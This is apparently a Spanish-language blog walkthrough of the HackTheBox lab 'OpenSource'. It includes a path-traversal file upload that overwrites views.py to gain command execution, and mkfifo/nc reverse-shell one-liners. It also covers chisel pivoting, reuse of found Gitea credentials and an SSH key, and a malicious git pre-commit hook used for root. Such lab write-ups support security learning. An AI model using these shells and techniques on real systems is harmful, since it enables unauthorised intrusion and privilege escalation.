---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | OpenSource         |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.11.164       |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/OpenSource/scan1.png)

Fuzzing

```s
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/wfuzz/webservices/ws-files.txt http://10.10.11.164/uploads/FUZZ
```

Podemos descargarnos el codigo fuente de la aplicacion, tambien vemos que no revisa que el archivo ya existe. Asi que intentaremos reemplazar views.py con las lineas siguientes:

![Scan 1](/assets/images/OpenSource/code_modificado.png)

Procedemos a usar burpsuite, para modificar el response del post. Cambiamos el nombre del archivo a ..//app/app/views.py y de esta manera, lo habremos puesto donde esta el original, pero con una funcion extra que nos permitira ejecutar los comandos que queramos. Y ahora podremos ejecutar comandos de cmd con:

_http://opensource.htb/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.29%204444%20%3E%2Ftmp%2Ff_

http://opensource.htb/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.29%204444%20%3E%2Ftmp%2Ff

![Shell to Docker container](/assets/images/OpenSource/reverse_shell.png)

Con un ifconfig, vimos que tenemos una interfaz extrana, la cual significara que estamos en un docker container. Una vez dentro, listaremos las demas maquinas a las que tenemos acceso.

```s
for i in $(seq 1 254); do (ping -c 1 172.17.0.$i | grep "bytes from"&); done
```

![Neighbors](/assets/images/OpenSource/other_machines.png)

En este punto vamos a usar una herramienta llamada <a href="https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz">chisel</a> para hacer el port forwarding con el contenedor que tenemos enfrente y esta permitido para usarlo en el OSCP.

Asi que lo primero seria descomprimirlo, luego quitarle peso con upx y abrir nuestro servidor http con python para descargarlo del otro lado. 

La maquina tiene wget, pero no pude descargarme de mi maquina el chisel por error de existencia. La manera mas facil fue cargar en la app el chisel y despues navegar dentro de el
Y al final desde el contenedor ejecutamos:

```s
#Le damos permisos
chmod +x chisel
Local: ./chisel_1.7.7_linux_amd64 server --reverse -p 1234
Target:./chisel_1.7.7_linux_amd64 client 10.10.14.29:1234 R:socks
```

Ahora que tenemos acceso localmente a lo mismo que la otra maquina, podemos escanear sus puertos ahora con un:

```s
proxychains nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.1
sudo nmap -sCV -p3000 172.17.0.1 -oN targeted
```

![Scan 4 nmap](/assets/images/OpenSource/nmap4.png)

Ahora que configuramos el proxy tambien en nuestro navegador, tenemos acceso a la interfaz web

![Gitea](/assets/images/OpenSource/gitea.png)

De acuerdo con las credenciales que encontramos hace rato en el otro repositorio, podemos entrar ahora dev01:Soulless_Developer#2022. Una vez dentro encontramos un repo que se llama backup y dentro tiene un directorio .ssh con un id_rsa que podemos usar para acceder a la otra maquina.

![Gitea backup](/assets/images/OpenSource/backup_gitea.png)

De igual forma, nos copiamos este id_rsa, le asignamos el permiso 600 y con proxychains nos conectamos a la ip 172.17.0.1, exportamos nuestras configuraciones de shell

```s
export TERM=xterm
export SHELL=bash
```

En este punto tambien podemos ya ver la flag.

![dev01 access](/assets/images/OpenSource/dev01_access.png)

Dentro tenemos las herramientas para escalar privilegios, asi que encontramos una brecha en el precomit

Asi que nos vamos a editar el archivo ~/.git/hooks/pre-commit.sample, dentro le ponemos la linea:

```s
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 443 >/tmp/f
```

lo guardamos como pre-commit

ahora solo tenemos que iniciar un proyecto en una carpeta nueva y le agregamos un archivo con cualquier contenido.

Hacemos nuestro repositorio de git como normalmente se hace:

```s
git init
git add .
git commit
```
Dentro del archivo commit lo dejamos limpio y nos ponemos en escucha en nuestra maquina. Guardamos el archivo y tendremos nuestra shell ahora.

![root](/assets/images/OpenSource/root.png)

![Powned](/assets/images/OpenSource/powned.png)
